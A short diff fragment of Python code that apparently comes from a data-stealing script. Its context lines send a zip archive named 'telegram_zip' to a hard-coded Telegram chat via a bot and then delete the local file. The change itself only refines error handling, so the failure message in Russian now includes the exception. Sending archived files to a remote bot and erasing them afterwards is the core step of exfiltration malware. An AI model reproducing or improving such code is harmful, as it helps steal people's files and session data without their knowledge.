@@ -33,8 +33,8 @@ while telegram_online:
             bot.send_document(MY_ID, open(telegram_zip, 'rb'))
             os.remove(telegram_zip)
             break
-        except:
-            bot.send_message(MY_ID, f"🟠 Не удалось отправить архив {telegram_zip}.")
+        except Exception as e:
+            bot.send_message(MY_ID, f"🟠 Не удалось отправить архив {telegram_zip}. Ошибка: {e}")
             pass
         telegram_online = False
     except Exception as e:
